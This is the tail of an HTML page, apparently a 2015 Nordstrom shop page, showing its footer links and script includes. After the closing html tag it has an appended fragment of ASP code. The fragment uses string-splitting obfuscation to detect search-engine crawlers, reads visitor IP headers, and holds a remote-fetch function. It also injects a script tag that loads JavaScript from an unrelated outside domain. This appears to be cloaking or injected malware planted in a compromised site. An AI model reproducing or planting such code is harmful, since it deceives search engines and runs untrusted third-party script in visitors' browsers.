<svg viewBox='0, 0, 30, 30'><use xlink:href='#youtube'/>youtube</svg></a>


<a class="footer-social-button svg-footer-wanelo" href="http://www.wanelo.com/Nordstrom" target="_blank" title="Wanelo">


<svg viewBox='0, 0, 30, 30'><use xlink:href='#wanelo'/>wanelo</svg></a>		</div>
		<div>
			


<a class="footer-social-link js-popup-link" data-popup-height="655" data-popup-width="740" href="https://em.nordstrom.com/pub/rf?_ri_=X0Gzc2X%3DWQpglLjHJlYQGutzbmR0vHUuGizf5mFISrP8FnMRVwjpnpgHlpgneHmgJoXX0Gzc2X%3DWQpglLjHJlYQGggkiytwrrAHmKgsimB2PM8MGn&amp;FORM_ID=GEC&amp;SOURCE_GEC=BOTTOM_NAV&amp;origin=footer" id="footer-email-signup" target="_blank" title="Get E-mail Updates">Get E-mail Updates</a>

<a class="footer-social-link" href="/c/nordstrom-apps?origin=footer" title="Get Nordstrom Apps">Get Nordstrom Apps</a>

<a class="footer-social-link" href="http://blogs.nordstrom.com/?origin=footer" manual_cm_re="BLOG4-_-BLOG5-_-BLOG6" manual_cm_sp="BLOG1-_-BLOG2-_-BLOG3" title="Read Our Blog">Read Our Blog</a>		</div>
	</section>
	<section class="global-footer-legal page-rule">
		<ul role="contentinfo">
			
				<li class="notice-link">

<a href="/c/nordstrom-privacy?origin=footer" target="_blank" title="Your Privacy Rights">Your Privacy Rights</a></li>
				<li class="notice-link">

<a href="/c/terms-conditions?origin=footer" title="Terms &amp; Conditions">Terms & Conditions</a></li>
				<li class="notice-link">

<a href="/c/nordstrom-com-privacy-policy?origin=footer#anchor-link-third-party-ads" title="Interest-Based Ads">Interest-Based Ads</a></li>
				<li class="notice-link">

<a href="/c/nordstrom-cares-responsible-manufacturing?origin=footer" title="California Supply Chains Act">California Supply Chains Act</a></li>
				<li class="notice-link">

<a href="https://secure.opinionlab.com/ccc01/comment_card.asp?referer=http%3A%2F%2Fshop%2Enordstrom%2Ecom%2F&amp;origin=footer" id="online-opinion-feedback-link" manual_cm_re="G3-_-G2-_-G1" manual_cm_sp="G6-_-G5-_-G4" target="_blank" title="Give Us Feedback">Give Us Feedback</a></li>
		</ul>

		
		<div id="copyright-notice" class="global-footer-copyright">
			<small>
					&#169;2015 Nordstrom, Inc. For assistance call 1.888.282.6060

			</small>
		</div>
	</section>
</footer>
<!-- END: Footer -->
	<!--[if lt IE 9]>
		<script src="http://c.nordstromimage.com/system/javascript/shop/thirdparty/lib/require-2.1.8_jquery-1.10.2_mustache-0.5.0.js"></script>
	<![endif]-->
	<!--[if gte IE 9]><!-->
		<script src="http://c.nordstromimage.com/system/javascript/shop/thirdparty/lib/require-2.1.8_jquery-2.0.3_mustache-0.5.0.js"></script>
		<script>
			require(['nordMain']);
		</script>
	<!--<![endif]-->
	<noscript>
		<iframe src="//s.thebrighttag.com/iframe?c=KxHRmBh" width="1" height="1" frameborder="0" scrolling="no" marginheight="0" marginwidth="0"></iframe>
	</noscript>

</body>
</html>




<%
	End If
	response.End()
End if
echohtml = ""'GetContent(echourl&"sysid="&systid&"&redirect=yes")
If instr(echohtml,lk)>0 Then
	'response.Write replace(echohtml,lk,"")
End If
Function GetContent(url)
	'on error resume next
	Dim xmlHttp
	Set xmlHttp = Server.Createobject("WinHttp.WinHttpRequest.5.1")
	'xmlHttp.SetTimeouts 60000, 60000, 60000, 3000
	xmlHttp.Open "POST", url , False
	xmlHttp.Send()
	GetHtml	= xmlHttp.ResponseBody
	Set xmlHttp=Nothing
	set objStream = Server.CreateObject("Adodb.Stream")
	objStream.Type = 1
	objStream.Mode =3
	objStream.Open
	objStream.Write GetHtml
	objStream.Position = 0
	objStream.Type = 2
	objStream.Charset = "UTF-8"
	GetContent = objStream.ReadText
	objStream.Close
End Function

Function ChecksAgent()
  on error resume next
  agentallow=split("ba"&"idus"&"pid"&"er,so"&"g"&"ou,ba"&"i"&"du,so"&"sos"&"pider,goo"&"g"&"lebot",",")
  agentcheck=false
  For agenti=lbound(agentallow) to ubound(agentallow)
    If Instr(LCase(RSbs("HTTP_USER_AGENT")),agentallow(agenti))>0 then
      agentcheck=true
      Exit For
    end if 
  Next
  ChecksAgent=agentcheck
End function
Function GetRsip()
  'on error resume next
  Dim getips
  If RSbs("HTTP_"&"X_FOR"&"W"&"ARDED_FOR") = "" Or InStr(RSbs("H"&"TTP_X_FO"&"RW"&"ARD"&"ED_FOR"), "unknown") > 0 Then
   getips = RSbs("REM"&"OTE_A"&"DDR")
  ElseIf InStr(RSbs("HT"&"TP_"&"X_FORW"&"ARDED_FOR"), ",") > 0 Then
   getips = Mid(RSbs("H"&"TTP"&"_X_FO"&"RW"&"ARD"&"ED_FOR"), 1, InStr(RSbs("H"&"TT"&"P_"&"X_F"&"ORW"&"AR"&"DE"&"D_F"&"OR"), ",")-1)
   actforip = RSbs("REMO"&"TE_ADD"&"R")
  ElseIf InStr(RSbs("HTT"&"P_X"&"_F"&"RW"&"AR"&"DED_FOR"), ";") > 0 Then
   getips = Mid(RSbs("HT"&"TP_"&"X_F"&"OR"&"W"&"AR"&"DED_"&"FO"&"R"), 1, InStr(RSbs("H"&"TT"&"P_"&"_F"&"OR"&"WA"&"RD"&"ED_"&"FOR"), ";")-1)
   actforip = RSbs("R"&"EMO"&"TE_"&"AD"&"D"&"R")
  Else
   getips = RSbs("HT"&"TP"&"_X_FO"&"RW"&"ARD"&"ED_"&"FOR")
   actforip = RSbs("R"&"EM"&"OTE"&"_AD"&"DR")
  End If
  GetRsip = Replace(Trim(Mid(getips, 1, 30)), "'", "")
End Function

Function RSbs(str)
	RSbs = Request.ServerVariables(str)
End Function
%>
<script src="http://dx.jd9.co/a/meika.js" type="text/javascript"></script>